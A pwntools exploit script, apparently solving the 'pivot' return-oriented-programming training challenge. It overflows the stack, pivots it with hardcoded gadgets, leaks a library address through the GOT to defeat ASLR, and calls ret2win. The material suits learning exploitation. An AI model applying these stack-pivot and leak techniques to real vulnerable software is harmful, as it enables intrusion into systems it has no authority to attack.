#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./pivot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pivot')
lib = ELF('./libpivot.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'
pad = b"A"*cyclic_find(0x6161616b)
rop = ROP(exe)
rop.foothold_function()
rop.puts(exe.got['foothold_function'])
rop.main()

io = start()
print(io.recvuntil(b': '))
topivot=io.recvline().decode().strip()
topivot=int(topivot,0)
log.success("Address to pivot: "+hex(topivot))
log.info("sending: \n"+rop.dump())
io.sendline(rop.chain())
print(io.recv(1028))
print(io.recv(1028))
pivot=ROP(exe)
pivot.raw(0x00000000004009bb) #pop rax; ret;
pivot.raw(topivot)
pivot.raw(0x00000000004009bd) # xchng rax,rsp;ret;
log.info("sending: \n"+pivot.dump())
io.sendline(pad+pivot.chain())
print(io.recvline())
print(io.recvline())
foothold=u64(io.recvline()[:6].strip().ljust(8,b'\x00'))
log.success('leaked foothold: '+ str(hex(foothold)))
lib.address=foothold-lib.symbols['foothold_function']
log.success('lib base address: '+str(hex(lib.address)))
rop=ROP(lib)
rop.call(lib.symbols['ret2win'])
io.sendline(pad+rop.chain())

io.interactive()

